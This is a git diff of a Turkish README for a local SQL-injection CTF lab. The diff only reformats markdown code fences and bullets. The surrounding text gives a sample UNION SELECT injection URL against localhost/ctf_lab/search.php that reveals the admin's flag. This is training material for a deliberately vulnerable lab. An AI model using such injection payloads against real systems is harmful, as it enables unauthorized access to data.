@@ -68,10 +68,11 @@ $dbname = "ctf_lab";
 ### 6. Laboratuvara Erişim
 - Tarayıcınızdan aşağıdaki URL’yi açın:
 
-```http
-http://localhost/ctf_lab/index.php
-Ana sayfada bulunan “Arama Sayfasına Git” butonuna tıklayın.
 ```
+http://localhost/ctf_lab/index.php
+```
+- Ana sayfada bulunan “Arama Sayfasına Git” butonuna tıklayın.
+
 - search.php sayfasına yönlendirileceksiniz.
 
 ### CTF Senaryosu ve Kullanımı
@@ -85,7 +86,7 @@ Ana sayfada bulunan “Arama Sayfasına Git” butonuna tıklayın.
 
 ### Örnek SQL Injection Payload
 - Flag’i görmek için aşağıdaki URL’yi kullanabilirsiniz:
-```http
+```
 http://localhost/ctf_lab/search.php?user=admin'%20UNION%20SELECT%20'admin',info%20FROM%20users%20WHERE%20username='admin'%20--%20-&id=1
 ```
 ### Not:
